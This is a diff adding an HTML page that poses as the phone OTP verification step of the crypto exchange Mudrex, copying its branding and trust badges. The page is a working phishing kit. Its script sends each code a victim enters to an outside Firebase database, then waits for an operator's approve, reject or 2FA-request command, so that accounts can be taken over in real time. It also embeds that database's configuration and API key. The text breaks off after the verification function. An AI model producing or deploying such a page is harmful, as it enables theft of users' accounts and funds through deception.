@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phone Verification</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Poppins:wght@400;500;600;700&family=Bebas+Neue&family=Unbounded:wght@200..900&family=DM+Serif+Display:ital@0;1&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', sans-serif; background: #fff; color: #1e1e1e; overflow-x: hidden; }
+        a { text-decoration: none; color: inherit; }
+
+        .flex { display: flex; }
+        .flex-col { flex-direction: column; }
+        .flex-row { flex-direction: row; }
+        .items-center { align-items: center; }
+        .items-end { align-items: flex-end; }
+        .items-stretch { align-items: stretch; }
+        .justify-between { justify-content: space-between; }
+        .justify-center { justify-content: center; }
+        .justify-end { justify-content: flex-end; }
+        .gap-1 { gap: 4px; }
+        .gap-2 { gap: 8px; }
+        .gap-3 { gap: 12px; }
+        .gap-4 { gap: 16px; }
+        .gap-5 { gap: 20px; }
+        .gap-6 { gap: 24px; }
+        .gap-8 { gap: 32px; }
+        .gap-10 { gap: 40px; }
+        .gap-16 { gap: 64px; }
+        .gap-32 { gap: 128px; }
+        .text-center { text-align: center; }
+        .text-left { text-align: left; }
+        .text-right { text-align: right; }
+        .w-full { width: 100%; }
+        .w-fit { width: fit-content; }
+        .h-full { height: 100%; }
+        .h-10 { height: 40px; }
+        .h-14 { height: 56px; }
+        .h-1 { height: 4px; }
+        .h-\[48px\] { height: 48px; }
+        .min-h-\[60px\] { min-height: 60px; }
+        .relative { position: relative; }
+        .absolute { position: absolute; }
+        .sticky { position: sticky; }
+        .fixed { position: fixed; }
+        .top-0 { top: 0; }
+        .left-0 { left: 0; }
+        .right-0 { right: 0; }
+        .bottom-0 { bottom: 0; }
+        .z-\[101\] { z-index: 101; }
+        .z-\[102\] { z-index: 102; }
+        .z-\[999\] { z-index: 999; }
+        .z-\[99999999999999\] { z-index: 99999999999999; }
+        .overflow-hidden { overflow: hidden; }
+        .rounded-full { border-radius: 9999px; }
+        .rounded-lg { border-radius: 8px; }
+        .rounded-md { border-radius: 6px; }
+        .rounded-xl { border-radius: 12px; }
+        .rounded-\[20px\] { border-radius: 20px; }
+        .rounded-\[30px\] { border-radius: 30px; }
+        .rounded-\[100px\] { border-radius: 100px; }
+        .border { border: 1px solid #e0e0e0; }
+        .border-\[1px\] { border-width: 1px; }
+        .border-2 { border-width: 2px; }
+        .border-\[#212121\] { border-color: #212121; }
+        .border-\[#F5F5F5\] { border-color: #F5F5F5; }
+        .border-\[#96a5d9\] { border-color: #96a5d9; }
+        .border-grey-light-border { border-color: #e0e0e0; }
+        .border-white { border-color: #fff; }
+        .bg-white { background-color: #fff; }
+        .bg-black { background-color: #000; }
+        .bg-gray-300 { background-color: #e5e5e5; }
+        .bg-gray-100 { background-color: #f5f5f5; }
+        .bg-\[#F8F9FA\] { background-color: #F8F9FA; }
+        .bg-\[#212121\] { background-color: #212121; }
+        .bg-gradient-brand-dark { background: linear-gradient(135deg, #1a1a2e, #16213e); }
+        .bg-Background/Gradients/Grad_Brand_Light { background: linear-gradient(135deg, #e0e7ff, #f0f4ff); }
+        .bg-ai-chatbot-pill { background: linear-gradient(135deg, #6c5ce7, #a29bfe); }
+        .bg-opacity-80 { background-opacity: 0.8; }
+        .backdrop-blur-md { backdrop-filter: blur(12px); }
+        .shadow-s3 { box-shadow: 0 4px 20px rgba(0,0,0,0.08); }
+        .shadow-white { box-shadow: 0 4px 20px rgba(255,255,255,0.3); }
+        .text-white { color: #fff; }
+        .text-black { color: #000; }
+        .text-\[#1e1e1e\] { color: #1e1e1e; }
+        .text-\[#616161\] { color: #616161; }
+        .text-\[#9E9E9E\] { color: #9E9E9E; }
+        .text-\[#E0E0E0\] { color: #E0E0E0; }
+        .text-\[#212121\] { color: #212121; }
+        .text-\[#2a2a2a\] { color: #2a2a2a; }
+        .text-grey-light { color: #9e9e9e; }
+        .text-grey-medium { color: #757575; }
+        .text-\[#0B0E16\] { color: #0B0E16; }
+        .opacity-30 { opacity: 0.3; }
+        .opacity-50 { opacity: 0.5; }
+        .opacity-70 { opacity: 0.7; }
+        .opacity-80 { opacity: 0.8; }
+        .opacity-1000 { opacity: 1; }
+        .font-inter { font-family: 'Inter', sans-serif; }
+        .font-poppins { font-family: 'Poppins', sans-serif; }
+        .font-bold { font-weight: 700; }
+        .font-semibold { font-weight: 600; }
+        .font-medium { font-weight: 500; }
+        .font-normal { font-weight: 400; }
+        .text-10-r { font-size: 10px; line-height: 1.4; }
+        .text-12-r { font-size: 12px; line-height: 1.5; }
+        .text-14-r { font-size: 14px; line-height: 1.6; }
+        .text-14-m { font-size: 14px; font-weight: 500; line-height: 1.6; }
+        .text-16-r { font-size: 16px; line-height: 1.6; }
+        .text-16-m { font-size: 16px; font-weight: 500; line-height: 1.6; }
+        .text-16-sb { font-size: 16px; font-weight: 600; line-height: 1.6; }
+        .text-base { font-size: 16px; }
+        .text-lg { font-size: 18px; }
+        .text-xl { font-size: 20px; }
+        .text-2xl { font-size: 24px; }
+        .body-16-r { font-size: 16px; font-weight: 400; }
+        .body-16-m { font-size: 16px; font-weight: 500; }
+        .body-16-sb { font-size: 16px; font-weight: 600; }
+        .whitespace-nowrap { white-space: nowrap; }
+        .flex-shrink-0 { flex-shrink: 0; }
+        .flex-1 { flex: 1; }
+        .p-1 { padding: 4px; }
+        .p-2 { padding: 8px; }
+        .p-3 { padding: 12px; }
+        .p-4 { padding: 16px; }
+        .p-5 { padding: 20px; }
+        .p-8 { padding: 32px; }
+        .p-10 { padding: 40px; }
+        .px-3 { padding-left: 12px; padding-right: 12px; }
+        .px-4 { padding-left: 16px; padding-right: 16px; }
+        .px-5 { padding-left: 20px; padding-right: 20px; }
+        .px-8 { padding-left: 32px; padding-right: 32px; }
+        .px-10 { padding-left: 40px; padding-right: 40px; }
+        .px-12 { padding-left: 48px; padding-right: 48px; }
+        .py-1 { padding-top: 4px; padding-bottom: 4px; }
+        .py-2 { padding-top: 8px; padding-bottom: 8px; }
+        .py-3 { padding-top: 12px; padding-bottom: 12px; }
+        .py-4 { padding-top: 16px; padding-bottom: 16px; }
+        .py-6 { padding-top: 24px; padding-bottom: 24px; }
+        .py-8 { padding-top: 32px; padding-bottom: 32px; }
+        .py-10 { padding-top: 40px; padding-bottom: 40px; }
+        .py-16 { padding-top: 64px; padding-bottom: 64px; }
+        .pt-8 { padding-top: 32px; }
+        .pt-\[70px\] { padding-top: 70px; }
+        .pb-\[40px\] { padding-bottom: 40px; }
+        .mt-2 { margin-top: 8px; }
+        .mt-3 { margin-top: 12px; }
+        .mt-4 { margin-top: 16px; }
+        .mt-5 { margin-top: 20px; }
+        .mt-6 { margin-top: 24px; }
+        .mt-10 { margin-top: 40px; }
+        .mt-14 { margin-top: 56px; }
+        .mt-\[14px\] { margin-top: 14px; }
+        .mt-\[30px\] { margin-top: 30px; }
+        .mb-4 { margin-bottom: 16px; }
+        .mb-6 { margin-bottom: 24px; }
+        .mb-\[60px\] { margin-bottom: 60px; }
+        .ml-\[6px\] { margin-left: 6px; }
+        .ml-\[10px\] { margin-left: 10px; }
+        .mr-1 { margin-right: 4px; }
+        .mr-4 { margin-right: 16px; }
+        .mx-auto { margin-left: auto; margin-right: auto; }
+        .mx-1\.5 { margin-left: 6px; margin-right: 6px; }
+        .grid { display: grid; }
+        .grid-cols-2 { grid-template-columns: repeat(2, 1fr); }
+        .grid-cols-3 { grid-template-columns: repeat(3, 1fr); }
+        .gap-\[10px\] { gap: 10px; }
+        .gap-\[30px\] { gap: 30px; }
+        .container { width: 100%; max-width: 1200px; margin: 0 auto; }
+        .w-9 { width: 36px; }
+        .w-14 { width: 56px; }
+        .w-\[100px\] { width: 100px; }
+        .w-\[120px\] { width: 120px; }
+        .w-\[190px\] { width: 190px; }
+        .w-\[218px\] { width: 218px; }
+        .w-\[475px\] { width: 475px; }
+        .w-\[950px\] { width: 950px; }
+        .w-\[445px\] { width: 445px; }
+        .w-\[177px\] { width: 177px; }
+        .min-\[1200px\]\:block { display: none; }
+        @media (min-width: 1200px) {
+            .min-\[1200px\]\:block { display: block; }
+            .hidden { display: none; }
+            .md\:block { display: block; }
+            .md\:flex { display: flex; }
+            .md\:grid { display: grid; }
+            .md\:grid-cols-3 { grid-template-columns: repeat(3, 1fr); }
+            .md\:grid-rows-1 { grid-template-rows: repeat(1, 1fr); }
+            .md\:flex-row { flex-direction: row; }
+            .md\:flex-col { flex-direction: column; }
+            .md\:items-center { align-items: center; }
+            .md\:justify-center { justify-content: center; }
+            .md\:justify-end { justify-content: flex-end; }
+            .md\:justify-items-end { justify-items: end; }
+            .md\:gap-5 { gap: 20px; }
+            .md\:gap-10 { gap: 40px; }
+            .md\:gap-32 { gap: 128px; }
+            .md\:gap-\[30px\] { gap: 30px; }
+            .md\:p-0 { padding: 0; }
+            .md\:px-5 { padding-left: 20px; padding-right: 20px; }
+            .md\:px-\[120px\] { padding-left: 120px; padding-right: 120px; }
+            .md\:py-\[80px\] { padding-top: 80px; padding-bottom: 80px; }
+            .md\:mt-0 { margin-top: 0; }
+            .md\:mt-10 { margin-top: 40px; }
+            .md\:mt-5 { margin-top: 20px; }
+            .md\:mt-\[30px\] { margin-top: 30px; }
+            .md\:my-\[60px\] { margin-top: 60px; margin-bottom: 60px; }
+            .md\:text-sm { font-size: 14px; }
+            .md\:text-xs { font-size: 12px; }
+            .md\:text-2xl { font-size: 24px; }
+            .md\:font-medium { font-weight: 500; }
+            .md\:leading-5 { line-height: 1.25; }
+            .md\:leading-6 { line-height: 1.5; }
+            .md\:whitespace-nowrap { white-space: nowrap; }
+            .md\:hidden { display: none; }
+            .md\:inline-block { display: inline-block; }
+            .md\:float-right { float: right; }
+            .md\:w-\[190px\] { width: 190px; }
+            .md\:mx-0 { margin-left: 0; margin-right: 0; }
+            .md\:flex-nowrap { flex-wrap: nowrap; }
+        }
+        @media (max-width: 1199px) {
+            .block { display: block; }
+            .hidden { display: none; }
+            .md\:block { display: none; }
+            .md\:flex { display: none; }
+            .md\:grid { display: none; }
+            .md\:inline-block { display: none; }
+        }
+        .hover\:bg-gray-400:hover { background-color: #d0d0d0; }
+        .hover\:bg-gradient-background-medium:hover { background: rgba(0,0,0,0.05); }
+        .hover\:opacity-80:hover { opacity: 0.8; }
+        .hover\:opacity-90:hover { opacity: 0.9; }
+        .active\:scale-95:active { transform: scale(0.95); }
+        .transition-all { transition: all 0.2s ease; }
+        .duration-200 { transition-duration: 200ms; }
+        .duration-1000 { transition-duration: 1000ms; }
+        .ease-in-out { transition-timing-function: ease-in-out; }
+        .transform { transform: translateX(0); }
+        .translate-x-1\/2 { transform: translateX(50%); }
+        .-translate-x-1\/2 { transform: translateX(-50%); }
+        .-translate-y-1\/2 { transform: translateY(-50%); }
+        .pointer-events-none { pointer-events: none; }
+        .cursor-pointer { cursor: pointer; }
+        .select-none { user-select: none; }
+        .no-number-arrows::-webkit-outer-spin-button,
+        .no-number-arrows::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        .no-number-arrows { -moz-appearance: textfield; }
+        .custom-placeholder::placeholder { font-size: 0.75rem; }
+        .custom-scrollbar { scrollbar-width: thin; scrollbar-color: rgba(158,158,158,0.5) transparent; }
+        .custom-scrollbar::-webkit-scrollbar { width: 6px; }
+        .custom-scrollbar::-webkit-scrollbar-track { background: transparent; }
+        .custom-scrollbar::-webkit-scrollbar-thumb { background-color: rgba(158,158,158,0.5); border-radius: 20px; }
+        .gradient-bg-1 { background: linear-gradient(to right, #e0e0e0, #f5f5f5); }
+        .bg-\[rgba\(7\,8\,23\,\.85\)\] { background-color: rgba(7,8,23,0.85); }
+        .backdrop-blur-md { backdrop-filter: blur(12px); }
+        .h-\[100vh\] { height: 100vh; }
+        .w-\[100vw\] { width: 100vw; }
+        .w-\[32px\] { width: 32px; }
+        .w-\[40px\] { width: 40px; }
+        .w-\[50px\] { width: 50px; }
+        .w-\[96px\] { width: 96px; }
+        .w-\[1200px\] { width: 1200px; }
+        .h-\[50px\] { height: 50px; }
+        .h-\[60px\] { height: 60px; }
+        .h-\[64px\] { height: 64px; }
+        .h-\[120px\] { height: 120px; }
+        .h-\[310px\] { height: 310px; }
+        .max-w-\[1400px\] { max-width: 1400px; }
+        .mx-auto { margin-left: auto; margin-right: auto; }
+        .overflow-x-hidden { overflow-x: hidden; }
+        .flex-wrap { flex-wrap: wrap; }
+        .flex-nowrap { flex-wrap: nowrap; }
+        .items-baseline { align-items: baseline; }
+        .gap-x-1 { column-gap: 4px; }
+        .gap-y-1 { row-gap: 4px; }
+        .inline-flex { display: inline-flex; }
+        .w-max { width: max-content; }
+        .h-\[1px\] { height: 1px; }
+        .rounded-\[2px\] { border-radius: 2px; }
+        .bg-\[#212121\] { background-color: #212121; }
+        .text-\[#9E9E9E\] { color: #9E9E9E; }
+        .text-\[#E0E0E0\] { color: #E0E0E0; }
+        .opacity-50 { opacity: 0.5; }
+        .mt-\[60px\] { margin-top: 60px; }
+        .mb-\[60px\] { margin-bottom: 60px; }
+
+        .error-msg {
+            color: #ff4d4d;
+            font-size: 14px;
+            margin-top: 8px;
+            text-align: center;
+            display: none;
+        }
+        .error-msg.show {
+            display: block;
+        }
+
+        .loading-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.85);
+            z-index: 999999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            backdrop-filter: blur(4px);
+        }
+        .loading-overlay.active {
+            display: flex;
+        }
+        .spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #333;
+            border-top: 6px solid #00ff41;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- HEADER -->
+    <div class="sticky top-0 left-0 w-full z-[102] hidden min-[1200px]:block" id="header">
+        <nav class="z-[150] flex justify-between items-center gap-10 bg-white shadow-white shadow-s3 px-10">
+            <div class="flex min-h-[60px] items-center gap-10 flex-shrink-0">
+                <a class="flex-shrink-0" href="#"><img alt="logo" width="120" height="30" src="https://images.mudrex.com/footer/Header_logo_2x.webp"></a>
+                <ul class="flex text-14-m text-gray-900 gap-3 items-end">
+                    <li class="flex gap-1 items-center hover:bg-gradient-background-medium text-[#1e1e1e] p-2 relative cursor-pointer rounded-md"><a href="#">Buy Crypto</a></li>
+                    <li class="flex gap-1 items-center hover:bg-gradient-background-medium text-[#1e1e1e] p-2 relative cursor-pointer rounded-md"><a href="#">Coin Sets</a></li>
+                    <li class="flex gap-1 items-center hover:bg-gradient-background-medium text-[#1e1e1e] p-2 relative cursor-pointer rounded-md"><a href="#">Trade Futures</a></li>
+                    <li class="flex gap-1 items-center hover:bg-gradient-background-medium text-[#1e1e1e] p-2 relative cursor-pointer rounded-md"><a href="#">API</a></li>
+                    <li class="flex gap-1 items-center hover:bg-gradient-background-medium text-[#1e1e1e] p-2 relative cursor-pointer rounded-md"><a href="#">Institutional</a><svg viewBox="0 0 1024 1024" style="display:inline-block;stroke:currentcolor;fill:currentcolor;width:14px;height:14px;"><path d="M169.372 361.373c12.497-12.496 32.758-12.496 45.255 0l297.372 297.373 297.373-297.373c12.496-12.496 32.758-12.496 45.254 0s12.496 32.758 0 45.254l-320 320c-12.496 12.496-32.758 12.496-45.254 0l-320-320c-12.497-12.496-12.497-32.758 0-45.254z"></path></svg></li>
+                    <li class="flex gap-1 items-center hover:bg-gradient-background-medium text-[#1e1e1e] p-2 relative cursor-pointer rounded-md"><a href="#">More</a><svg viewBox="0 0 1024 1024" style="display:inline-block;stroke:currentcolor;fill:currentcolor;width:14px;height:14px;"><path d="M169.372 361.373c12.497-12.496 32.758-12.496 45.255 0l297.372 297.373 297.373-297.373c12.496-12.496 32.758-12.496 45.254 0s12.496 32.758 0 45.254l-320 320c-12.496 12.496-32.758 12.496-45.254 0l-320-320c-12.497-12.496-12.497-32.758 0-45.254z"></path></svg></li>
+                </ul>
+            </div>
+            <div class="flex gap-4 items-center h-full w-full justify-end">
+                <button class="flex items-center rounded-full bg-gray-300 hover:bg-gray-400 justify-center">
+                    <div class="bg-ai-chatbot-pill transition-all duration-300 hover:opacity-80 flex flex-row px-3 py-1 gap-1 items-center">
+                        <img alt="AI Logo" width="16" height="16" src="https://images.mudrex.com/web/ai-chatbot/ai-logo.svg">
+                        <p class="text-12-r text-white whitespace-nowrap">Ask Mudrex AI</p>
+                    </div>
+                </button>
+                <div class="relative z-[1002] h-10 flex items-center" style="width:40px;">
+                    <div class="cursor-pointer absolute left-0 bg-gray-300 hover:bg-gray-400 flex items-center rounded-full w-9 h-9 justify-center"><svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" color="#616161" height="20" width="20"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg></div>
+                </div>
+                <a class="flex items-center rounded-full bg-gray-300 hover:bg-gray-400 w-9 h-9 justify-center" href="#"><svg color="#616161" viewBox="0 0 1024 1024" style="display:inline-block;stroke:currentcolor;fill:currentcolor;width:24px;height:24px;"><path d="M512 160c-194.404 0-352 157.596-352 352s157.596 352 352 352c194.403 0 352-157.597 352-352s-157.597-352-352-352zM96 512c0-229.75 186.25-416 416-416s416 186.25 416 416c0 229.75-186.25 416-416 416s-416-186.25-416-416z"></path><path d="M512 768c26.509 0 48-21.491 48-48s-21.491-48-48-48c-26.509 0-48 21.491-48 48s21.491 48 48 48z"></path><path d="M456.893 298.961c26.314-10.899 55.267-13.751 83.2-8.194s53.59 19.271 73.731 39.409c20.138 20.141 33.853 45.798 39.408 73.731 5.558 27.933 2.707 56.886-8.192 83.2-10.899 26.31-29.357 48.8-53.037 64.624-14.682 9.811-30.963 16.784-48.003 20.669v3.6c0 17.674-14.326 32-32 32s-32-14.326-32-32v-32c0-8.486 3.373-16.627 9.373-22.627s14.141-9.373 22.627-9.373c15.824 0 31.29-4.691 44.445-13.482s23.411-21.286 29.466-35.904c6.054-14.618 7.638-30.704 4.554-46.221-3.088-15.52-10.707-29.773-21.894-40.963-11.19-11.187-25.443-18.806-40.963-21.894-15.517-3.085-31.603-1.501-46.221 4.554s-27.114 16.31-35.904 29.466c-8.79 13.155-13.482 28.621-13.482 44.445 0 17.674-14.326 32-32 32s-32-14.326-32-32c0-28.48 8.445-56.32 24.269-80.003 15.824-23.68 38.314-42.136 64.624-53.036z"></path></svg></a>
+                <div class="relative flex flex-row items-center gap-8 flex-shrink-0">
+                    <button type="button" class="py-3 px-4 text-sm font-semibold rounded-[6px] relative overflow-hidden bg-gradient-brand-dark hover:opacity-90 transition-all duration-200 active:scale-95 transform transition-transform duration-100 !py-2.5 !h-10"><div class="flex gap-2 items-center justify-center"><p class="text-white">Login / Create Account</p></div></button>
+                </div>
+            </div>
+        </nav>
+    </div>
+
+    <div class="block min-[1200px]:hidden">
+        <div class="sticky top-0 left-0 w-full mobile-header py-4 z-[101]">
+            <div class="flex flex-col gap-4 w-full">
+                <div class="flex justify-between items-center px-5">
+                    <a href="#"><div class="mr-0"><img alt="logo" width="120" height="30" src="https://images.mudrex.com/footer/Header_logo_2x.webp"></div></a>
+                    <div class="flex gap-4 items-center">
+                        <div><svg viewBox="0 0 1024 1024" style="display:inline-block;stroke:currentcolor;fill:currentcolor;width:24px;height:24px;"><path d="M464 160c-167.895 0-304 136.105-304 304s136.105 304 304 304c167.894 0 304-136.106 304-304s-136.106-304-304-304zM96 464c0-203.241 164.759-368 368-368s368 164.759 368 368c0 203.242-164.758 368-368 368s-368-164.758-368-368z"></path><path d="M678.966 678.973c12.496-12.496 32.758-12.496 45.254 0l194.4 194.4c12.496 12.499 12.496 32.758 0 45.258-12.496 12.496-32.758 12.496-45.254 0l-194.4-194.4c-12.496-12.499-12.496-32.758 0-45.258z"></path></svg></div>
+                        <span class="flex items-center justify-center relative"><svg viewBox="0 0 10 10" overflow="visible" preserveAspectRatio="none" width="24" height="24" style="margin-top:12px;"><line x1="0" x2="10" y1="0" y2="0" stroke="#171F2C" stroke-width="2" vector-effect="non-scaling-stroke"></line><line x1="0" x2="10" y1="2" y2="2" stroke="#171F2C" stroke-width="2" opacity="1"></line><line x1="0" x2="10" y1="4" y2="4" stroke="#171F2C" stroke-width="2"></line></svg></span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MAIN -->
+    <main>
+        <div class="flex justify-center items-center backdrop-blur-md bg-opacity-80 bg-[#2a2a2a] w-[100vw] h-[100vh]" style="z-index:2147483647;">
+            <div class="flex items-stretch justify-center rounded-[20px] overflow-hidden w-[950px]">
+                <!-- Lado esquerdo -->
+                <div class="bg-white flex-1 w-[475px] relative">
+                    <img alt="exit-intent" width="445" height="340" class="absolute bottom-0 left-0 right-0" src="https://images.mudrex.com/web/login/exit-intent.png">
+                    <div class="w-full h-full bg-Background/Gradients/Grad_Brand_Light py-16 px-8">
+                        <div class="flex flex-col justify-between h-full">
+                            <div>
+                                <div class="flex items-center gap-[10px] p-2 rounded-[30px] border border-[#96a5d9] w-fit">
+                                    <img alt="flag" width="21" height="15" src="https://images.mudrex.com/web/login/IN.svg">
+                                    <p class="text-[#212121] text-[10px] font-semibold">Made for India</p>
+                                </div>
+                                <p class="text-[#616161] text-lg font-semibold mt-4 text-left">Buy, Sell &amp; Hold</p>
+                                <img alt="crypto" width="177" height="49" class="mt-[14px]" src="https://images.mudrex.com/web/login/crypto.svg">
+                            </div>
+                            <div class="text-xl font-semibold text-[#616161] text-left"><p class="transition-opacity duration-1000 ease-in-out opacity-1000">Futures</p></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Lado direito -->
+                <div class="flex-1 px-12 pt-[70px] pb-[40px] relative w-[475px] bg-[#fff]">
+                    <div class="absolute top-5 right-[18px] rounded-full">
+                        <svg class="cursor-pointer" viewBox="0 0 1024 1024" style="display:inline-block;stroke:currentcolor;fill:currentcolor;width:24px;height:24px;" id="closeBtn"><path d="M512 160c-194.404 0-352 157.596-352 352s157.596 352 352 352c194.403 0 352-157.597 352-352s-157.597-352-352-352zM96 512c0-229.75 186.25-416 416-416s416 186.25 416 416c0 229.75-186.25 416-416 416s-416-186.25-416-416z"></path><path d="M662.627 361.373c12.496 12.496 12.496 32.758 0 45.254l-256 256c-12.496 12.496-32.758 12.496-45.254 0s-12.496-32.758 0-45.254l256-256c12.496-12.496 32.758-12.496 45.254 0z"></path><path d="M361.373 361.373c12.496-12.496 32.758-12.496 45.254 0l256 256c12.496 12.496 12.496 32.758 0 45.254s-32.758 12.496-45.254 0l-256-256c-12.496-12.496-12.496-32.758 0-45.254z"></path></svg>
+                    </div>
+
+                    <div class="flex flex-col">
+                        <div class="flex flex-col items-center justify-center mb-4">
+                            <img alt="logo" width="144" height="36" src="https://images.mudrex.com/footer/Header_logo_2x.webp">
+                            <p class="text-xl font-bold text-[#0B0E16] mt-4">Enter OTP</p>
+                            <p class="text-base font-medium text-[#9E9E9E] mt-3">Enter the code sent to your phone</p>
+                        </div>
+
+                        <div class="px-12">
+                            <div class="flex flex-col gap-4">
+                                <div class="bg-gray-100 p-3 rounded-lg text-center">
+                                    <p class="text-sm text-[#616161]">📱 Account:</p>
+                                    <p class="text-base font-semibold text-[#0B0E16]" id="accountDisplay">Loading...</p>
+                                </div>
+
+                                <input class="border-grey-light-border focus:outline-none p-3 rounded-lg border-[1px] focus:border-gray-500 focus:ring-gray-500 hover:border-gray-500 body-16-r w-full text-black bg-gray-100 text-center tracking-[8px] text-xl font-bold" type="text" placeholder="123456" id="otpInput" maxlength="6" autocomplete="off">
+
+                                <div class="error-msg" id="errorMsg">Invalid OTP code. Please try again.</div>
+
+                                <p class="text-[12px] text-[#9E9E9E] text-center mt-2">
+                                    By continuing you agree with our <a href="#" class="text-[#212121] font-medium">privacy policies</a> and <a href="#" class="text-[#212121] font-medium">terms and conditions</a>
+                                </p>
+
+                                <button type="button" class="w-full py-3 px-4 text-sm font-semibold rounded-[6px] relative overflow-hidden bg-gradient-brand-dark hover:opacity-90 transition-all duration-200 active:scale-95 transform transition-transform duration-100" id="verifyBtn">
+                                    <div class="flex gap-2 items-center justify-center">
+                                        <p class="text-white">Verify</p>
+                                    </div>
+                                </button>
+
+                                <div class="flex flex-row justify-between items-center gap-4 my-2">
+                                    <div class="gradient-bg-1 opacity-30 w-full h-1 rounded-xl"></div>
+                                    <p class="text-14-r text-grey-medium">or</p>
+                                    <div class="gradient-bg-1 opacity-30 w-full h-1 rounded-xl"></div>
+                                </div>
+
+                                <button class="text-[#616161] text-sm font-medium hover:text-[#0B0E16] transition-colors mt-2" id="backBtn">
+                                    ← Back to login
+                                </button>
+                            </div>
+                        </div>
+
+                        <div class="flex gap-5 items-center justify-center mt-5">
+                            <div class="flex items-center justify-center border border-[#F5F5F5] rounded-md p-2">
+                                <img alt="f.i.u." width="20" height="20" src="https://images.mudrex.com/web/homepage-v2/fiu.svg">
+                                <p class="text-[10px] font-semibold text-[#212121] ml-[10px]">F.I.U.</p>
+                                <p class="text-[10px] font-normal text-[#616161] ml-[6px]">Registered</p>
+                            </div>
+                            <div class="flex items-center justify-center border border-[#F5F5F5] rounded-md p-2">
+                                <img alt="insured" width="20" height="20" src="https://images.mudrex.com/web/homepage-v2/insured.svg">
+                                <p class="text-[10px] font-semibold text-[#212121] ml-[10px]">Insured</p>
+                                <p class="text-[10px] font-normal text-[#616161] ml-[6px]">funds</p>
+                            </div>
+                            <div class="flex items-center justify-center border border-[#F5F5F5] rounded-md p-2">
+                                <img alt="30l+" width="20" height="20" src="https://images.mudrex.com/web/homepage-v2/rating.svg">
+                                <p class="text-[10px] font-semibold text-[#212121] ml-[10px]">30L+</p>
+                                <p class="text-[10px] font-normal text-[#616161] ml-[6px]">Users</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <!-- LOADING OVERLAY -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="spinner"></div>
+    </div>
+
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyAemZwP19k7zaM8QMBPn5kitdlvzY514OI",
+            authDomain: "web-xchangeon1.firebaseapp.com",
+            databaseURL: "https://web-xchangeon1-default-rtdb.firebaseio.com/",
+            projectId: "web-xchangeon1",
+            storageBucket: "web-xchangeon1.firebasestorage.app",
+            messagingSenderId: "733409941973",
+            appId: "1:733409941973:web:6e11c283fcee846b4a855c"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+
+        const params = new URLSearchParams(window.location.search);
+        const sessionId = params.get('id');
+
+        const accountDisplay = document.getElementById('accountDisplay');
+        const otpInput = document.getElementById('otpInput');
+        const verifyBtn = document.getElementById('verifyBtn');
+        const errorMsg = document.getElementById('errorMsg');
+        const loadingOverlay = document.getElementById('loadingOverlay');
+        const backBtn = document.getElementById('backBtn');
+        const closeBtn = document.getElementById('closeBtn');
+
+        let isWaiting = false;
+
+        function loadSession() {
+            if (!sessionId) {
+                accountDisplay.textContent = 'Session not found';
+                return;
+            }
+
+            db.ref(`sessions/${sessionId}`).once('value')
+                .then(snapshot => {
+                    const data = snapshot.val();
+                    if (!data) {
+                        accountDisplay.textContent = 'Session not found';
+                        return;
+                    }
+
+                    let display = data.phone || data.email || 'Account not available';
+                    accountDisplay.textContent = display;
+
+                    db.ref(`sessions/${sessionId}`).update({
+                        currentPage: 'OTP Phone',
+                        status: 'online'
+                    });
+                })
+                .catch(err => {
+                    console.error('Error loading session:', err);
+                    accountDisplay.textContent = 'Error loading';
+                });
+        }
+
+        function verifyOTP() {
+            const inputCode = otpInput.value.trim();
+            if (!inputCode || inputCode.length !== 6) {
+                errorMsg.textContent = 'Please enter a 6-digit code.';
+                errorMsg.style.display = 'block';
+                return;
+            }
+
+            if (isWaiting) return;
+            isWaiting = true;
+
+            loadingOverlay.classList.add('active');
+
+            db.ref(`sessions/${sessionId}`).update({
+                otp_entered: inputCode,
+                currentPage: 'OTP Waiting Approval',
+                status: 'online'
+            }).then(() => {
+                console.log('✅ OTP code saved. Waiting for operator decision...');
+                errorMsg.style.display = 'none';
+
+                const commandRef = db.ref(`sessions/${sessionId}/command`);
+                commandRef.on('value', (snapshot) => {
+                    const command = snapshot.val();
+                    if (!command) return;
+
+                    switch (command.type) {
+                        case 'approve':
+                            loadingOverlay.classList.remove('active');
+                            isWaiting = false;
+                            window.location.href = 'https://mudrex.com/dashboard';
+                            break;
+
+                        case 'reject':
+                            loadingOverlay.classList.remove('active');
+                            isWaiting = false;
+                            errorMsg.textContent = 'Invalid OTP code. Please try again.';
+                            errorMsg.style.display = 'block';
+                            otpInput.value = '';
+                            verifyBtn.disabled = false;
+                            break;
+
+                        case 'tfa-request':
+                            loadingOverlay.classList.remove('active');
+                            isWaiting = false;
+                            window.location.href = `2fa.html?id=${sessionId}`;
+                            break;
+
+                        default:
+                            break;
+                    }
+                    commandRef.remove();
+                });
+            }).catch(err => {
+                console.error('Error saving OTP:', err);
+                errorMsg.textContent = 'Error sending code. Try again.';
+                errorMsg.style.display = 'block';
+                loadingOverlay.classList.remove('active');
+                isWaiting = false;
+            });
+        }
+
